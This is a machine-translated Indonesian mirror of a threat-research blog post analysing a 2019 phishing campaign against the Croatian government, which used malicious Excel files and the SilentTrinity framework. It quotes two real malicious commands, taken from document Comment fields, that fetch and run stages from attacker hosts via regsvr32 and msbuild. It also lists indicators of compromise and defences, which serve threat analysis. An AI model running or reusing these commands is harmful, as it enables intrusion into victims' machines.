<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ•´ğŸ¿ ğŸ‘©ğŸ¾â€ğŸ¤â€ğŸ‘¨ğŸ» ğŸ‘¨ğŸ½â€ğŸ”¬ IronPython di sisi kejahatan: bagaimana kami menemukan serangan cyber pada layanan publik di negara Eropa ğŸ‘©â€ğŸ‘©â€ğŸ‘¦ ğŸ’­ ğŸ’»</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pakar kami dari pusat keamanan pakar selalu mengikuti dan memantau munculnya ancaman baru yang menarik dan berbahaya. Begitulah, pada awal April 2019,...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>IronPython di sisi kejahatan: bagaimana kami menemukan serangan cyber pada layanan publik di negara Eropa</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/458766/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="gambar"></a> <br><br>  Pakar kami dari pusat keamanan pakar selalu mengikuti dan memantau munculnya ancaman baru yang menarik dan berbahaya.  Begitulah, pada awal April 2019, sebuah serangan yang ditargetkan pada pemerintah Kroasia ditemukan.  Laporan ini memeriksa rantai pengiriman malware ke komputer korban, menyajikan indikator kompromi, dan mencatat penggunaan kerangka kerja pasca-operasional baru, yang, menurut data kami, tidak pernah digunakan oleh penyerang. <a name="habracut"></a><br><br><h2>  Infeksi korban </h2><br>  Pada 2 April 2019, selama pemantauan rutin berbagai sumber daya untuk malware baru, para pakar PT Expert Security Center menemukan dokumen kantor yang tidak biasa. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/719/16e/e61/71916ee61f47e529490f3da0ca0db121.png" alt="gambar"><br><br>  <i>Gambar 1. Dokumen berbahaya</i> <br><br>  Pemberitahuan pengiriman dibuat dalam aplikasi MS Excel office dan disimpan dalam format XLS lama sehari sebelumnya (2019-04-01 16:28:07 (UTC)).  Namun demikian, cap waktu yang tersedia di media (2018-07-25 00:12:30 (UTC)) menunjukkan bahwa dokumen tersebut digunakan kembali pada tahun 2018.  Kami akan kembali ke gejala tidak langsung di bawah ini. <br><br>  Perlu dicatat bahwa bidang Komentar (yang dapat diubah, termasuk menggunakan aplikasi MS Excel) berisi perintah di shell Windows: <br><br><pre><code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>): objShell.Run <span class="hljs-string"><span class="hljs-string">"net use https://postahr.vip"</span></span>, 0, False: Wscript.Sleep 10000: objShell.Run <span class="hljs-string"><span class="hljs-string">"regsvr32 /u /n /s /i:https://postahr.vip/page/1/update.sct scrobj.dll"</span></span>, 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/557/a53/082/557a53082352f47cc4c079305408a7cc.png" alt="gambar"><br><br>  <i>Gambar 2. Kolom "Komentar" dengan konten yang mencurigakan</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a93/f80/6e8/a93f806e8dca3dfb1a81ee0da457da95.png" alt="gambar"><br><br>  <i>Gambar 3. Isi bidang Komentar dalam bentuk biner</i> <br><br>  Sebagai hasil dari mengeksekusi perintah ini, sistem membuat skrip dalam bahasa Visual Basic, yang, ketika diluncurkan, akan melakukan tindakan berikut: <br><br><ul><li>  menghubungkan sumber daya jaringan menggunakan teknologi WebDAV, </li><li>  unduh dan jalankan file infeksi tahap berikutnya menggunakan utilitas sistem yang sah regsvr32. </li></ul><br>  Ketika sumber daya jaringan terhubung melalui HTTP (S), permintaan NTLM dikirim ke server penyerang, dengan bantuan yang hash NTLM dapat dipulihkan.  Kemudian hash yang diterima dapat digunakan untuk otorisasi pada layanan atas nama korban.  Kami tidak menemukan jejak serangan seperti itu, dan alasan untuk menghubungkan sumber daya jaringan tetap tidak jelas. <br><br>  Teknik menggunakan regsvr32 (mengelola kontrol ActiveX) untuk tujuan jahat bukanlah hal baru dan bahkan memiliki nama - Squiblydoo.  Penyerang menggunakannya untuk memenuhi persyaratan untuk mengendalikan peluncuran program tepercaya, serta untuk memotong deteksi anti-virus. <br><br>  Dengan sendirinya, teks di bidang Komentar tidak berbahaya, dan pelaksanaannya harus dikondisikan.  Ketika korban membuka dokumen Excel yang diterima, pesan perangkap berbahasa Kroasia muncul yang memberitahu Anda untuk menyertakan makro: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/97d/8a4/b5a/97d8a4b5a0406ebef6d02ea3c8b1b994.png" alt="gambar"><br><br>  <i>Gambar 4. Perangkap pesan setelah membuka dokumen</i> <br><br>  Jika makro dibolehkan, pengguna akan melihat pemberitahuan paket palsu dengan logo pos Kroasia: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d64/2d3/1e2/d642d31e23e0d4fa7ca34dc652ad522b.png" alt="gambar"><br><br>  <i>Gambar 5. Pemberitahuan paket salah</i> <br><br>  Sementara itu, menggunakan alat makro, skrip untuk bidang Komentar akan dieksekusi, dan skrip yang dibuat dalam sistem akan ditambahkan ke startup: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/678/7ab/4aa/6787ab4aab57ef3ad22b190c2474f8c5.png" alt="gambar"><br><br>  <i>Gambar 6. Logika makro kunci</i> <br><br>  Anehnya, skrip yang sedang dibuat tidak dipicu oleh makro.  Mungkin inilah maksud dari penyerang: tahap infeksi berikutnya akan terjadi setelah sistem reboot dan login pengguna.  Kami akan kembali ke detail di bawah ini. <br><br>  Bagian dari skenario menarik dengan caranya sendiri: struktur kode rapi dengan pemformatan, lekukan dan nuansa markup lainnya dapat menjadi tanda menggunakan kode pihak ketiga dan bahkan sebuah program yang memungkinkan Anda untuk membuat dokumen semacam itu secara otomatis. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ba4/e7c/2cc/ba4e7c2ccb1eeb9bb4a2de8dbf8dda13.png" alt="gambar"><br><br>  <i>Gambar 7. Agaknya meminjam bagian dari makro</i> <br><br>  Pencarian kata kunci menyediakan banyak potongan kode yang serupa pada sumber daya yang berbeda.  Kami cenderung meyakini bahwa peretas hanya menemukan kode program yang sesuai dan mengubahnya sedikit untuk melakukan tindakan yang diperlukan: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/899/608/9fc/8996089fca65afdf132c69c6d943a6fa.png" alt="gambar"><br><br>  <i>Gambar 8. Contoh makro serupa di issuu.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fa5/c22/3f6/fa5c223f681efa6950cb71067f26c877.png" alt="gambar"><br><br>  <i>Gambar 9. Contoh makro serupa di stackoverflow.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/1dd/bdb/f59/1ddbdbf592989692bc8d15712f638f37.png" alt="gambar"><br><br>  <i>Gambar 10. Contoh makro serupa di dummies.com</i> <br><br>  Mari kita kembali ke tahap infeksi berikutnya menggunakan utilitas regsvr32.  Ketika perintah dijalankan, skrip update.sct dalam JavaScript akan diunduh dari server penyerang.  Badan skrip berisi data biner yang disandikan oleh algoritma Base64.  Setelah decoding, data yang diterima akan di-deserialisasi dan dieksekusi menggunakan platform perangkat lunak .NET Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0e0/d7d/9f8/0e0d7d9f8b6324b3aadce5a203d28075.png" alt="gambar"><br><br>  <i>Gambar 11. Skrip update.sct diunduh dari server penyerang</i> <br><br>  Perlu dicatat bahwa kode ini juga dipinjam oleh penyerang di salah satu sumber daya publik: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b26/b9c/673/b26b9c673c0aace886123fc47b3d70c4.png" alt="gambar"><br><br>  <i>Gambar 12. Contoh kode serupa di rastamouse.me</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/25e/5ec/aef/25e5ecaeff7cebf201d5781fb8423ddc.png" alt="gambar"><br><br>  <i>Gambar 13. Contoh kode serupa di github.com</i> <br><br>  Tampaknya hacker tidak dengan hati-hati menyelidiki logika dari alat yang digunakan.  Misalnya, dalam skrip yang dianggap, fungsi setversion dipanggil, yang tidak melakukan apa-apa.  Salah satu contoh yang tersedia di web juga terlihat. <br><br>  Objek yang dibongkar dan diluncurkan adalah file PE yang dapat dieksekusi pada platform .NET. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/20f/274/650/20f274650305046ab50359cd089a517d.png" alt="gambar"><br><br>  <i>Gambar 14. Header file PE yang dapat dieksekusi</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/cf6/946/d54/cf6946d543b6b8a02f79bc06b3470d7e.png" alt="gambar"><br><br>  <i>Gambar 15. Informasi debug file SharpPick PE</i> <br><br>  Sebagai hasil kompilasi, jalur ke proyek dengan kode sumber dipertahankan.  Akhiran -master menunjukkan bahwa proyek sebelumnya dikloning dari repositori, dan direktori SharpPick mengarah ke aplikasi terkenal yang memungkinkan Anda untuk mengunduh dan mengeksekusi kode PowerShell tanpa menggunakan penerjemah bahasa secara langsung, tetapi menggunakan dependensi .NET. <br>  Terlepas dari ketersediaan proyek utilitas SharpPick di GitHub, Anda harus memastikan bahwa tidak ada perubahan signifikan yang telah dibuat. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/300/f5f/689/300f5f689737fae0872ddaaaec6d5fbc.png" alt="gambar"><br><br>  <i>Gambar 16. Bagian dari kode utilitas SharpPick yang telah didekompilasi</i> <br><br>  Sebagai hasil dari dekompilasi, pseudo-code diperoleh, selama itu diterjemahkan dari Base64 dan skrip PowerShell diluncurkan: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fd7/9c0/dae/fd79c0dae768b4bc3e6bd8916b871c4a.png" alt="gambar"><br><br>  <i>Gambar 17. Skrip PowerShell yang dikonversi sebagian</i> <br><br>  Setelah menyederhanakan kode, tidak sulit untuk menguraikan logikanya: <br><br><ul><li>  sebuah objek dibentuk untuk berinteraksi dengan server web dengan pengaturan User-Agent, Cookie dan proxy yang ditentukan; </li><li>  muatan dimuat di alamat yang ditentukan; </li><li>  hasilnya didekripsi oleh algoritma RC4 menggunakan kunci yang ditentukan dan dimulai. </li></ul><br>  Sayangnya, selama penelitian kami, server manajemen sudah tidak tersedia.  Data yang diterima darinya tadi, tidak bisa kami temukan.  Namun, kali ini ada cukup informasi di Web (contoh: laporan rekan kami dari <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=https://www.google.com/url%3Fq%3D">FireEye</a> ) untuk secara jelas menetapkan: tautan akhir dalam rantai infeksi ini adalah Empire backdoor, alat untuk administrasi jarak jauh komputer korban sebagai bagian dari kerangka kerja pasca-operasional Empire Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b7e/a88/eab/b7ea88eab8ddfb21880d2f2a8b04f51d.png" alt="gambar"><br><br>  <i>Gambar 18. Menggunakan skrip PowerShell yang serupa untuk menyerang kerentanan di WinRAR</i> <br><br>  Menariknya, pola skrip lainnya mengarah ke artikel yang luas tentang teknik pengujian penetrasi dengan perhatian khusus untuk menyembunyikan infrastruktur penyerang di belakang server proxy.  Sumber informasi yang paling mungkin digunakan oleh penyerang adalah sebuah artikel oleh rekan-rekan dari Payatu Technologies, di mana mereka <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=https://www.google.com/url%3Fq%3D">memberikan</a> instruksi terperinci tentang mengarahkan ulang sesi ke sumber daya yang sah, memblokir paket yang tidak diinginkan, logging, dan sebagainya, termasuk menggunakan Empire. <br><br>  Beberapa jam kemudian, kami menemukan dokumen lain di bungkusan itu.  Ini memiliki banyak kesamaan dengan yang sebelumnya: juga ditemukan di Kroasia (2019-04-02 16:52:56 (UTC)), memiliki nama yang sama dan bahkan gambar jebakan tentang paket yang diterima.  Namun tetap ada perbedaan. <br><br>  Kode berbahaya lagi terletak di bidang Komentar, tetapi kali ini logika tindakan telah diubah. <br><br><pre> <code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>):objShell.Run <span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe /c net use \\176.105.255.59\webdav"</span></span>,0:Wscript.Sleep 60000: objShell.Run <span class="hljs-string"><span class="hljs-string">"%windir%\Microsoft.Net\Framework\v4.0.30319\msbuild.exe \\176.105.255.59\webdav\msbuild.xml"</span></span> , 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><ul><li>  Sumber daya jaringan terhubung menggunakan protokol SMB. </li><li>  Unduh dan luncurkan tahap infeksi berikutnya menggunakan msbuild, utilitas yang sah dari paket .NET Framework. </li></ul><br>  Sangat menarik bahwa baris webdav hadir di alamat direktori yang dipasang, secara tidak langsung menghubungkan kasus ini dengan yang sebelumnya.  Kali ini, serangan terhadap hash NTLM masih mungkin terjadi, meskipun tidak ada bukti penggunaannya.  Sekali lagi, aplikasi yang sah (kali ini msbuild) digunakan untuk berhasil melewati pembatasan meluncurkan program pihak ketiga.  Sebelum kami menjelaskan teknik penyalahgunaan, kami menyebutkan perbedaan dalam kode program makro dokumen baru. <br><br>  Penyerang tidak membuat perubahan signifikan pada logika skrip VBA.  Tetapi perlu dicatat bahwa kali ini mereka tidak hanya menyediakan pemuatan otomatis dari skrip VBS yang dibuat dalam sistem, tetapi juga meluncurkannya saat dokumen dibuka.  Kemungkinan besar, dalam kasus sebelumnya, para penyerang hanya melupakannya, dan setelah beberapa waktu, setelah menemukan kesalahan, mereka memperbaikinya dalam versi baru dokumen. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/77d/670/2b3/77d6702b3bc07650a4f462b62cf975fd.png" alt="gambar"><br><br>  <i>Gambar 19. Perbandingan kode makro dalam dua dokumen</i> <br><br>  Tahap infeksi berikutnya adalah dokumen XML yang berisi kode C #.  Fitur utilitas msbuild memungkinkan Anda mengkompilasi dan menjalankan kode yang terkandung dengan cepat, sebagaimana dibuktikan oleh komentar yang ditinggalkan oleh peretas di awal markup. <br><br>  Buffer Base64 sekali lagi disajikan dalam kode, yang akan diterjemahkan, didekompresi oleh algoritma Deflate, dan diluncurkan.  Kami percaya bahwa pembaca sudah menyadari bahwa kali ini penyerang juga menggunakan templat yang dapat diakses secara bebas, sebagaimana dibuktikan oleh komentar yang disebutkan dan banyak sumber di Web dengan kode yang sama. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d68/6ea/4ac/d686ea4acff8cb52067c0c53cb6bf749.png" alt="gambar"><br><br>  <i>Gambar 20. Tugas msbuild.xml diunduh dari server penyerang</i> <br><br>  Akibatnya, kali ini file PE pada platform .NET akan dimuat dan dieksekusi ke dalam memori.  Dan informasi debugging tidak hanya berisi tanda bahwa proyek dikumpulkan pada mesin virtual (mungkin untuk menyembunyikan informasi tentang penyerang), tetapi juga direktori SILENTTRINITY, yang akan kita bahas lebih terinci. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/adf/3fe/653/adf3fe65355eb2c7418a5438afc5aa34.png" alt="gambar"><br><br>  <i>Gambar 21. Informasi debug dari file PE SILENTTRINITY</i> <br><br>  Setelah mempelajari dua dokumen parsel ini, kami menemukan dua lagi.  Baik format file, nama, dan gambar perangkap dengan wilayah yang ditentukan tetap tidak berubah.  Dokumen tersedia pada akhir Agustus 2018, yang mengkonfirmasi hipotesis tentang sifat jangka panjang kampanye, yang kami tulis di awal laporan. <br><br>  Sangat mengherankan bahwa peretas tahun lalu tidak menggunakan bidang "Komentar", tetapi mereka meluncurkan utilitas yang sah.  Komponen jahat dimuat menggunakan utilitas untuk bekerja dengan sertifikat dan operasi kriptografi certutil, dan peluncuran disediakan oleh alat manajemen sistem WMI: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/95b/f2f/5a9/95bf2f5a9dc3693dd275bc9153e2a364.png" alt="gambar"><br><br>  <i>Gambar 22. Perbandingan makro dokumen 2018</i> <br><br>  Sayangnya, setelah batasan apa yang terjadi, kami tidak dapat membuat tautan selanjutnya dalam rantai serangan 2018. <br><br>  Perlu juga dicatat bahwa bagian dari kode skrip VBA tetap tidak berubah, dengan pengecualian komentar tambahan yang dihapus yang menjelaskan logika kerja. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ef4/16b/9ee/ef416b9ee48a47b9795cf24db66b7555.png" alt="gambar"><br><br>  <i>Gambar 23. Perbandingan makro 2019 dan 2018</i> <br><br><h2>  Kerangka SilentTrinity </h2><br>  Hasil pencarian untuk kata kunci SILENTTRINITY dari informasi debug file PE dapat dengan mudah menentukan asal dari tautan serangan ini.  Pada Oktober 2018, Marcello Salvati (seorang peneliti di Black Hills Information Security) memposting sebuah proyek bernama SILENTTRINITY pada repositori GitHub yang populer.  Gagasan utama: untuk menggunakan fleksibilitas dan keuntungan dari kerangka kerja PowerShell pasca-operasi yang terkenal dalam bahasa pemrograman Python, yaitu IronPython.  Proyek ini berkembang hingga hari ini. <br><br>  Kami tidak akan menggali rincian pekerjaan dan implementasi proyek (terutama karena penulis berbicara secara rinci tentang hal itu dalam <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=https://www.google.com/url%3Fq%3D">laporannya</a> ).  Kami hanya akan menyoroti logika dasar kerja dan poin menarik dalam implementasi. <br><br>  Setelah memulai file-PE (namun, tautan perantara mungkin dalam format yang berbeda), berikut ini terjadi: <br><br><ul><li>  akses ke server manajemen untuk mengunduh arsip ZIP dengan dependensi yang diperlukan dan skrip Python utama; </li><li>  konten arsip diekstraksi tanpa menyimpan ke disk; </li><li>  dependensi terdaftar untuk keberhasilan pemrosesan skrip Python; </li><li>  Skrip Python utama diluncurkan, menunggu tugas dari penyerang; </li><li>  setiap tugas ditransfer sebagai skrip Python yang sudah jadi; </li><li>  tugas dilakukan di sisi korban dalam utas terpisah; </li><li>  hasil pekerjaan ditransfer kembali ke server manajemen. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/ed9/250/ca2/ed9250ca2557c5f70ff18d60c33f1b31.png" alt="gambar"><br><br>  <i>Gambar 24. Diagram operasi framework SilentTrinity</i> <br><br>  Dari fitur-fiturnya, perlu digarisbawahi hal-hal berikut: <br><br><ul><li>  Dukungan untuk IronPython, termasuk bahasa Boo (subset dari IronPython dengan pengetikan data yang kuat). </li><li>  Semua aktivitas tidak memerlukan ruang disk: dependensi, skrip, tugas berada di memori (serangan fileless). </li><li>  Arsip dengan dependensi, tugas, hasil kerja tim - semua komunikasi antara korban dan peretas dienkripsi dengan algoritma AES. </li><li>  Kunci yang dibagikan dihasilkan oleh protokol Diffie-Hellman. </li><li>  Transport jaringan disediakan pada level protokol HTTP (S) dengan dukungan proxy. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="gambar"><br><br>  <i>Gambar 25. Contoh antarmuka pengguna dari sisi server kerangka kerja SilentTrinity</i> <br><br>  Menariknya, pada hari serangan, loader PE diunggah ke layanan VirusTotal, di mana tidak ada vendor anti-virus yang mengidentifikasinya sebagai malware.  Ini tidak mengherankan: pertama, file biner tidak sampai ke disk, dan deteksi tanda tangan tidak masuk akal;  kedua, deteksi statis jauh dari satu-satunya teknologi untuk melindungi pengguna. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d24/126/15c/d2412615ccb6eadccf22c7bec91aa7ec.png" alt="gambar"><br><br>  <i>Gambar 26. Hasil pemindaian bootloader SilentTrinity pada hari serangan</i> <br><br>  Selain itu, beberapa hari setelah serangan, vonis deteksi masih mulai muncul.  Penting bahwa selama periode serangan, baik peralatan pelindung belum dilengkapi dengan algoritma pendeteksian, atau ancaman pada prinsipnya tidak diketahui. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e6e/3f2/9d9/e6e3f29d93ff8aa9053c3e7dc4ac30ce.png" alt="gambar"><br><br>  <i>Gambar 27. Hasil pemindaian saat ini dari bootloader SilentTrinity</i> <br><br>  Kemungkinan besar, ini adalah alasan untuk memilih solusi ini untuk melakukan serangan.  Kami tidak memiliki informasi bahwa kerangka kerja SilentTrinity telah digunakan dalam serangan berbahaya sebelumnya. <br><br>  Infrastruktur Digunakan oleh Penyerang <br><br>  Perlu disebutkan bahwa infrastruktur jaringan yang digunakan oleh peretas secara kronologis terkait dengan serangan yang sedang berlangsung. <br><br><img src="https://habrastorage.org/webt/9u/uq/ug/9uuqugtgx2tbnobx9tjhadnbldk.png"><br><br>  <i>Tabel 1. Informasi tentang domain yang digunakan sebagai server penyerang</i> <i><br></i> <br><br>  Domain dibuat sedemikian rupa sehingga menyerupai sumber daya serangan yang sah.  Ini memungkinkan pengguna untuk mendapatkan kepercayaan dalam serangan phishing.  Perhatikan bahwa sumber daya yang terlibat tidak terbatas pada Kroasia. <br><br>  Semua domain terdaftar menggunakan teknologi keamanan WhoisGuard.  Ini memungkinkan Anda untuk menyembunyikan informasi nyata tentang pendaftar domain untuk melindungi dari spam, sementara penyerang menggunakan teknologi ini untuk penganoniman. <br><br>  Server yang mendistribusikan dan mengelola malware disewa dari penyedia Breezle Belanda. <br><br>  Semua informasi yang tersedia tentang node, alamat, dan domain para penyerang dengan banyak koneksi di antara mereka memungkinkan kita untuk menilai tentang sejumlah besar malware yang dimiliki penyerang saat ini.  Kami tidak mengecualikan bahwa dalam alat kampanye yang serupa dengan yang dipertimbangkan dapat digunakan dan beberapa kasus infeksi tetap tidak terpecahkan. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/88d/308/4a4/88d3084a4fdcc666d13cb22d0f7ca88a.png" alt="gambar"><br><br>  <i>Gambar 28. Representasi grafis dari infrastruktur penyerang</i> <br><br><h2>  Kesimpulan </h2><br>  Sehari setelah penemuan dokumen dalam <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=https://www.google.com/url%3Fq%3D">berita</a> , siaran pers dikeluarkan dengan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=https://www.google.com/url%3Fq%3D">tautan</a> ke Departemen Keamanan Sistem Informasi Kroasia tentang serangan phishing yang ditargetkan.  Jejak ditemukan di beberapa badan pemerintah negara itu.  Dilaporkan bahwa email dikirim kepada para korban dengan tautan ke situs phishing yang darinya diusulkan untuk mengunduh dokumen jahat yang darinya analisis kami dimulai.  Ini mengisi tautan yang hilang dalam rantai serangan, dan pada akhirnya kami ingin memperhatikan metode perlindungan yang dapat mengurangi kerusakan dari serangan tersebut: <br><br><ul><li>  Memantau dan mengendalikan penggunaan beberapa program tepercaya (certutil, regsvr32, msbuild, net, wmic ...) </li><li>  Memeriksa dan menganalisis tidak hanya lampiran dalam email, tetapi juga tautan web </li><li>  Pemindaian memori PC berkala di jaringan perusahaan </li><li>  Koneksi yang berhasil ke C2 Silent Trinity (bahkan di bawah TLS) dapat dideteksi menggunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PT Network Attack Discovery</a> , di samping itu, di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">repositori kami, kami menerbitkan deteksi untuk komunitas.</a> </li></ul><br>  <b>Diposting oleh</b> Alexey Vishnyakov, Positive Technologies <br><br>  PS Mengenai hal ini, penulis juga membaca laporan di Positive Hack Days 9. Video presentasi ini dan lainnya tersedia di: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">www.phdays.com/en/broadcast/</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Indikator kompromi:</b> <div class="spoiler_text">  0adb7204ce6bde667c5abd31e4dea164 <br>  13db33c83ee680e0a3b454228462e73f <br>  78184cd55d192cdf6272527c62d2ff89 <br>  79e72899af1e50c18189340e4a1e46e0 <br>  831b08d0c650c8ae9ab8b4a10a199192 <br>  92530d1b546ddf2f0966bbe10771521f <br>  c84b7c871bfcd346b3246364140cd60f <br>  hxxps: //postahr.vip/page/1/update.sct <br>  hxxps: //posteitaliane.live/owa/mail/archive.srf <br>  hxxps: //konzum.win/bat3.txt <br>  hxxp: //198.46.182.158/bat3.txt <br>  hxxps: //176.105.255.59: 8089 <br>  [\\] 176.105.255.59 \ webdav \ msbuild.xml <br>  postahr.online <br>  176.105.254.52 <br>  93.170.105.32 </div></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id458766/">https://habr.com/ru/post/id458766/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id458754/index.html">GPS untuk kumbang kotoran: sistem orientasi multimodal</a></li>
<li><a href="../id458756/index.html">Bagaimana Kami Belajar Menjadi Data Didorong dengan GoPractice Simulator</a></li>
<li><a href="../id458758/index.html">Kemegahan dan kemiskinan literatur yang diterjemahkan</a></li>
<li><a href="../id458760/index.html">Pameran Las Vegas adalah untuk pengembang elektronik, bukan konsumen. Laporan dari Design Automation Conference</a></li>
<li><a href="../id458764/index.html">Praktek Agile Dasar untuk Tim Teknis dan Non-Teknis pada tahun 2019</a></li>
<li><a href="../id458768/index.html">5-6 alasan untuk datang ke GolangConf</a></li>
<li><a href="../id458770/index.html">Seluruh kebenaran tentang RTOS. Artikel # 29. Gangguan pada Nucleus SE</a></li>
<li><a href="../id458774/index.html">DBMS fungsional</a></li>
<li><a href="../id458778/index.html">Satellite 6.5 Engine Reporting: Apa dan Mengapa</a></li>
<li><a href="../id458782/index.html">Adaptasi program untuk ZX Spectrum ke TR-DOS dengan cara modern. Bagian 3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>